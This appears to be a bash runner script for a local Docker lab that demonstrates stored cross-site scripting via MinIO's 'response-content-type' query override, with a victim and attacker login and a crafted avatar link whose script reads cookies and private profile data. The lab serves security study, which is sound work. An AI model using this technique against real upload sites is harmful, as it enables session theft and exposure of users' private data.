#!/usr/bin/env bash
# One-shot lab runner: build and start the full stack (MinIO + TargetSocial
# site + nginx reverse proxy), initialize the public bucket, then walk
# through the direct-MinIO stages of the lab. Site instructions are printed
# at the end.
set -euo pipefail
cd "$(dirname "$0")/.."

echo "[*] Building and starting the full lab stack (bound to 127.0.0.1 only)..."
docker compose up -d --build

echo "[*] Waiting for bucket initialization..."
for i in $(seq 1 60); do
  if docker compose logs setup 2>/dev/null | grep -q "LAB-READY"; then
    break
  fi
  sleep 2
  if [ "$i" -eq 60 ]; then
    echo "[!] setup did not finish in time:"
    docker compose logs setup | tail -n 20
    exit 1
  fi
done

docker compose logs setup 2>/dev/null | grep -v "^$" | tail -n 6

echo
echo "=============================================================="
echo " Part A - direct MinIO access: the write-up's core behavior"
echo "=============================================================="
echo
echo "-> Stage 1: baseline GET (the uploader's forced Content-Type)"
./scripts/01-baseline-get.sh

echo
echo "-> Stage 2: ?response-content-type=text/html (the override)"
./scripts/02-content-type-override.sh

echo
echo "-> Stage 3: verify the stored payload is served as HTML"
./scripts/03-verify-stored-xss.sh

cat <<'EOF'

==============================================================
 Part B - the "real target" site: http://target.com:8080
==============================================================

 1. Make sure /etc/hosts has: 127.0.0.1 target.com
    (see README for the exact command)

 2. Open http://target.com:8080 in your browser and log in:
    alice / alice-pass-123   (victim)
    bob   / bob-pass-123     (attacker)

 3. In a second (private) window, log in as bob and upload
    payloads/avatar-payload.png from the "Upload avatar" page.
    It passes every check: .png extension, PNG magic bytes,
    forced Content-Type: image/png.

 4. Send alice this crafted link (the whole attack is the query param):

    http://target.com:8080/uploads/avatar-bob.png?response-content-type=text/html

 5. Open that link as logged-in alice: the same bytes that were
    validated as a PNG are now rendered as HTML on the
    target.com origin, the script reads cookies and fetches
    alice's private /profile data same-origin.

Reset everything (including avatars): docker compose down -v
EOF
